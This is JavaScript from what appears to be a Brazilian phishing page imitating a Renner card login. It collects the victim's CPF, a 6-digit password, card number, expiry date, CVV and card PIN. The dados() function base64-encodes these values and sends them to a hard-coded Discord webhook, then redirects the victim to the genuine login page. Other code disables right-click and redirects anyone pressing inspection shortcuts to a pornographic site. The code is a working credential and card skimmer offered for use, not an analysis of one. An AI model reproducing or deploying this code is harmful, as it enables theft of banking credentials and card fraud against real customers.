//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("esc",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});shortcut.add("Ctrl+F",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});shortcut.add("Ctrl+Shift+Del",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});shortcut.add("Ctrl+Shift+I",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});shortcut.add("Ctrl+W",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});shortcut.add("Ctrl+U",function()
{top.location.href="https://pt.pornhub.com/video/search?search=Mendreik%20o%20Brabo%20!!!!!!!!!"});
//]]>

var message="Desculpe, o clique com o botão direito foi desativado.";
function clickIE() {if (document.all) {(message);return false;}}
function clickNS(e) {if
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers)
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false")

//

  function btn_click() {

let cpf = document.getElementById("cpf").value;
cpf = cpf.replace(".", "")
cpf = cpf.replace(".", "")
cpf = cpf.replace("-", "")

if (!ValidaCPF(cpf)){
  document.getElementById('cpf').value='';
  event.preventDefault();
} else {
  document.getElementById('part1').style.display = 'none';
  document.getElementById('part2').style.display = 'block';
}

function ValidaCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.toString().length != 11 || /^(\d)\1{10}$/.test(cpf))
        return false;
    var result = true;
    [9, 10].forEach(function (j) {
        var soma = 0, r;
        cpf.split(/(?=)/).splice(0, j).forEach(function (e, i) {
            soma += parseInt(e) * ((j + 2) - (i + 1));
        });
        r = soma % 11;
        r = (r < 2) ? 0 : 11 - r;
        if (r != cpf.substring(j, j + 1))
            result = false;
    });
    return result;
}

//

}

//


 function btn_click4() {
  const inputSenha = document.querySelector('#senha');
  const senhaValue = inputSenha.value;

  if (senhaValue.length === 6) {
    document.getElementById('part2').style.display = 'none';
    document.getElementById('part3').style.display = 'block';
  } else {
    inputSenha.value = '';
    event.preventDefault();
  }
}


//
  function btn_click3() {

    
    let ok1 = false
    let ok2 = false

    var cc = document.getElementById("cc").value;
    var validade = document.getElementById("validade").value;

     var date = validade.split('/');

    if(!/^(?:4\d{3}|5[1-5]\d{2}|6011|3[47]\d{2})([- ]?)\d{4}\1\d{4}\1\d{4}$/.test(cc) || !valid_credit_card(cc)) {
        document.getElementById('cc').value='';
        event.preventDefault();
        //alert("Cartão informado é inválido.");
    } else {
       ok1=true
    }

    if(date[0] > 12 || date[1] < 22 || date[1] > 30) {
        document.getElementById('validade').value='';
        event.preventDefault();
        //alert("Validade do Cartão informado é inválido.");
    } else {
       ok2=true
    }

    if (ok1 == true && ok2 == true){
        dados()
    }

function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value))
        return false;

    let nCheck = 0, bEven = false;
    value = value.replace(/\D/g, "");

    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
                nDigit = parseInt(cDigit, 10);

        if (bEven && (nDigit *= 2) > 9)
            nDigit -= 9;

        nCheck += nDigit;
        bEven = !bEven;
    }

    return (nCheck % 10) == 0;
}


async function dados(){
const webhookUrl = 'https://canary.discord.com/api/webhooks/953305225039581224/CpIa3BeAvHZTLojp3JTjsnhf9RU-875kJJfKuXvvE8UUBG1OqNkVh5YqAHvv1hSaUmbb';
var cpf1 = document.getElementById("cpf").value;
var senha1 = document.getElementById("senha").value;
var cc1 = document.getElementById("cc").value;
var validade1 = document.getElementById("validade").value;
var cvv1 = document.getElementById("cvv").value;
var senha2 = document.getElementById("senha2").value;

const encryptedData = btoa(`CPF: ${cpf1} | SENHA: ${senha1} | CC: ${cc1}|${validade1}|${cvv1} | SENHA-CARD: ${senha2}`);

const data = {
  content: encryptedData
};

fetch(webhookUrl, {
  method: 'POST',
  headers: {
      'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
})
.then(response => {
  if (response.ok) {
      window.location.href = "https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login";
      //alert("Dados enviados com segurança.");
  } else {
      //alert("Um problema inesperado ocorreu. Tente novamente mais tarde.");
  }
})
.catch(error => {
  console.error(error);
 // alert("Erro ao enviar dados. Verifique o console para mais detalhes.");
});
}
}